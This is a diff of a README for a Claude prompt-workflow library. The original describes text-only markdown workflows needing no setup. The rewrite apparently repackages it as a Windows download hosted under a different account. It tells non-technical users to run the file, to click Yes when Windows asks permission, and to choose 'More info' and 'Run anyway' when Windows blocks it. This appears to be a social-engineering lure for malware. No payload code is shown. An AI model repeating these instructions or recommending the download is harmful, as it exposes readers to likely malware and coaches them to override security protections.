@@ -1,105 +1,284 @@
-# Claude Workflow Library
+# 🤖 claude-workflow-library - Simple AI Workflows for Daily Tasks
 
-> Complete step-by-step workflows that turn complex tasks into simple, repeatable systems — built specifically for non-technical users.
-> No coding required.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Unladylike-gatekeeper954/claude-workflow-library)
 
-![License](https://img.shields.io/badge/license-MIT-green)
-![Workflows](https://img.shields.io/badge/workflows-10-blue)
-![Audience](https://img.shields.io/badge/audience-non--technical-orange)
-![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
+## 🚀 What This Is
 
----
+claude-workflow-library is a set of ready-to-use AI workflows for study, research, writing, business, and more. It is built for non-technical users who want clear steps instead of a blank page.
 
-## Why this exists
+Use it to:
+- study faster
+- organize research
+- draft better writing
+- plan work tasks
+- turn ideas into action
+- save time on repeat work
 
-Most AI guides give you prompts. This library gives you systems.
+## 🖥️ What You Need
 
-A prompt tells you what to say to Claude once. A workflow tells you 
-exactly what to do from start to finish — every step, every prompt, 
-in the right order — so you get a real result, not just a response.
+This app is made for Windows users. Before you start, make sure you have:
 
-Every workflow here is designed for people without technical 
-backgrounds. No APIs. No code. No setup beyond a Claude account.
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough free space to save the files
+- A modern web browser such as Chrome, Edge, or Firefox
+- Access to Claude or another supported AI account if your workflow uses it
 
----
+For most users, no special setup is needed beyond that.
 
-## Who this is for
+## 📥 Download and Install
 
-- Students who want to study and learn more effectively
-- Researchers who need to organize complex information
-- Writers working on articles, reports, and content
-- Professionals making important decisions
-- Job seekers preparing applications and interviews
-- Anyone who wants to use AI as a real system, not a toy
+Visit this page to download and run the app:
 
----
+[Download claude-workflow-library](https://github.com/Unladylike-gatekeeper954/claude-workflow-library)
 
-## Workflow Library
+After you open the link:
 
-| Workflow | What it helps you do |
-|----------|----------------------|
-| [Study Workflow](workflows/study-workflow.md) | Turn any subject into notes, flashcards, and practice tests |
-| [Research Workflow](workflows/research-workflow.md) | Go from question to organized, synthesized findings |
-| [Writing Workflow](workflows/writing-workflow.md) | Take any piece from idea to polished draft |
-| [Business Workflow](workflows/business-workflow.md) | Build a business plan, strategy, or market analysis |
-| [Content Workflow](workflows/content-workflow.md) | Create and repurpose content across platforms |
-| [Decision Making Workflow](workflows/decision-making-workflow.md) | Make complex decisions with clarity and confidence |
-| [Learning Workflow](workflows/learning-workflow.md) | Learn any new skill from scratch with structure |
-| [Job Search Workflow](workflows/job-search-workflow.md) | Handle resumes, cover letters, and interview prep |
-| [Productivity System](workflows/productivity-system.md) | Plan your days, weeks, and goals with AI support |
-| [Life Planning System](workflows/life-planning-system.md) | Set goals, build habits, and design your direction |
+1. Look for the latest version or release file
+2. Download the file to your computer
+3. Open the downloaded file
+4. Follow the on-screen steps
+5. If Windows asks for permission, choose Yes or Run
+6. Wait for the setup to finish
+7. Open the app from your Start menu or desktop shortcut
 
----
+If the download comes as a ZIP file:
 
-## How each workflow is structured
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Start the app from the main file inside the folder
 
-Every workflow in this library follows the same format:
+## 🧭 How to Use It
 
-- Who it is for — so you know immediately if it fits your situation
-- What you will end up with — the concrete output at the end
-- Step-by-step process — exactly what to do and in what order
-- Prompts for each step — copy, paste, fill in the brackets
-- Pro tips — what separates good results from great ones
-- Common mistakes — what to avoid and why
+The library is arranged around simple workflows. Each workflow gives you a path to follow from start to finish.
 
----
+Typical use looks like this:
 
-## How to use a workflow
+1. Pick a task type, such as study, research, or writing
+2. Open the matching workflow
+3. Read the first step
+4. Copy the prompt or follow the action shown
+5. Paste your input into Claude or your chosen AI tool
+6. Review the output
+7. Move to the next step until the task is done
 
-1. Pick the workflow that matches your current goal
-2. Read the "Who this is for" section to confirm it fits
-3. Follow the steps in order — do not skip ahead
-4. Copy each prompt, paste it into [claude.ai](https://claude.ai), 
-   replace the [brackets] with your information
-5. Save the workflow as a template for next time
+You do not need to know how the workflow works behind the scenes. Just follow the steps in order.
 
----
+## 📚 Included Workflow Areas
 
-## Related resources
+### ✏️ Writing
+Use these workflows to shape rough ideas into clean drafts.
 
-If you want individual prompts rather than full workflows, see the 
-companion repository: 
-[Claude Prompts for Non-Technical Users](https://github.com/sajin-prompts/claude-prompts-non-technical)
+Common writing tasks:
+- blog posts
+- emails
+- reports
+- outlines
+- summaries
+- first drafts
 
----
+These workflows help you set a goal, gather points, and turn them into clear text.
 
-## Contributing
+### 🔎 Research
+Use research workflows when you need facts, structure, or a better view of a topic.
 
-Found a workflow that works well? Want to improve an existing one?
-See [CONTRIBUTING.md](CONTRIBUTING.md) — contributions from 
-non-technical users are especially welcome.
+Common research tasks:
+- topic scanning
+- source review
+- note taking
+- fact grouping
+- comparison tables
+- research summaries
 
----
+These steps help you keep track of what matters and reduce messy notes.
 
-## Maintained by
+### 🎓 Study
+Study workflows help you learn faster and remember more.
 
-This library is maintained alongside the Claude Prompts for 
-Non-Technical Users repository as part of a broader effort to 
-make Claude's full capability accessible to people without 
-technical backgrounds.
+Common study tasks:
+- reading support
+- exam prep
+- flashcard creation
+- lesson summaries
+- concept breakdowns
+- quiz practice
 
-Active since April 2026. Updated regularly.
+If you are a student, this can help you turn long material into simple study plans.
 
----
+### 💼 Business
+Business workflows help with everyday work tasks.
 
-*If this helped you, consider starring the repo — it helps others find it.*
+Common business tasks:
+- planning
+- task lists
+- meeting notes
+- client messages
+- process writing
+- decision support
+
+These workflows are useful for office work, solo work, and small teams.
+
+### 🧩 Productivity
+Use productivity workflows to handle repeated tasks in a steady way.
+
+Common productivity tasks:
+- planning your day
+- sorting priorities
+- breaking big jobs into steps
+- tracking progress
+- reducing time spent on routine work
+
+This keeps work simple and easier to manage.
+
+## 🛠️ Basic Setup
+
+After you install the app, take a few minutes to set it up for your own use.
+
+1. Open the app
+2. Review the workflow list
+3. Choose the categories that fit your needs
+4. Save the workflows you use most often
+5. Keep your favorite prompts in one place
+6. Test one workflow from start to finish
+
+A good first test is a short writing or study task. That gives you a quick feel for the process.
+
+## 📌 Best Way to Start
+
+If you are new to AI workflows, start small.
+
+Try this order:
+1. Use a simple summary workflow
+2. Then try a writing workflow
+3. Then test a research workflow
+4. Move to a business or planning workflow
+
+This helps you learn the structure without feeling stuck.
+
+## 🧾 Example Uses
+
+### Study
+Paste class notes into a study workflow and ask for:
+- a short summary
+- key terms
+- a quiz
+- flashcards
+
+### Research
+Use a research workflow to:
+- compare two topics
+- pull out main points
+- build a list of questions
+- organize notes into sections
+
+### Writing
+Use a writing workflow to:
+- turn bullet points into a draft
+- improve tone
+- shorten long text
+- create an outline before writing
+
+### Business
+Use a business workflow to:
+- write meeting notes
+- plan a project
+- draft a client update
+- sort tasks by priority
+
+## 🧠 Tips for Better Results
+
+Keep these tips in mind while using the workflows:
+
+- Use short, clear input
+- Give the AI one task at a time
+- Keep your goal simple
+- Save useful prompts for later
+- Edit the output before you share it
+- Use the same workflow again when the task repeats
+
+Good input gives better output. The workflow helps you stay on track.
+
+## 🔄 How the Workflow Library Helps
+
+This library gives you structure when you need it.
+
+It can help you:
+- avoid staring at a blank page
+- keep your steps in order
+- work faster on repeat tasks
+- make AI use feel less confusing
+- turn general ideas into useful results
+
+That makes it a practical tool for everyday work and learning.
+
+## 📁 File Layout
+
+You may see folders or files for different task groups, such as:
+
+- study
+- research
+- writing
+- business
+- productivity
+- general use
+
+Each group is meant to help you find the right workflow without searching through a long list.
+
+## 🔐 Privacy and Local Use
+
+Use the workflows with care when they include private notes, client details, or school work.
+
+Good practice:
+- remove personal data you do not want to share
+- check before pasting sensitive content into any AI tool
+- keep a copy of your original notes
+- review output before using it in public or work files
+
+## 🧰 Troubleshooting
+
+### The file does not open
+- Download it again
+- Make sure the file finished downloading
+- Try extracting the ZIP file if needed
+- Right-click the file and choose Open
+
+### Windows blocks the file
+- Choose More info if shown
+- Then choose Run anyway if you trust the source
+- Make sure you used the link from this repository
+
+### The workflow looks confusing
+- Start with a simple use case
+- Read the first step only
+- Follow one workflow from top to bottom
+- Try a short task before a long one
+
+### The AI output is not good
+- Use clearer input
+- Add more context
+- Ask for one result at a time
+- Try a different workflow for that task
+
+## 📎 Quick Start Checklist
+
+- Download the app
+- Open it on Windows
+- Pick one workflow
+- Try a short task
+- Review the result
+- Save the workflows you use most
+
+## 🧩 Who This Is For
+
+This library is a good fit for:
+- students
+- writers
+- researchers
+- office workers
+- small business owners
+- anyone who wants AI help without coding
+
+## 📌 Repository Topics
+
+ai, ai-workflows, anthropic, claude, learning, llm, non-coders, non-technical, productivity, prompt-engineering, research, study
